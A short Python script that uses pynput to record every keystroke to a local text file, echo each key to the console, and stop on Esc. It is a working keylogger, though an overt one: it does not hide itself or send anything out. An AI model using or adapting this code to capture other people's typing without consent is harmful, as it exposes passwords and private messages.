from pynput import keyboard

def keyPressed(key):
    print(f"Key pressed: {key}")
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            logKey.write(f'[{key}]')  
            print("Special key pressed.")

    
    if key == keyboard.Key.esc:
        print("Escape key detected. Terminating the program...")
        return False 

if __name__ == "__main__":
    print("Program is now running. Press 'Esc' to stop it.")
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()  
    print("Program has been terminated.")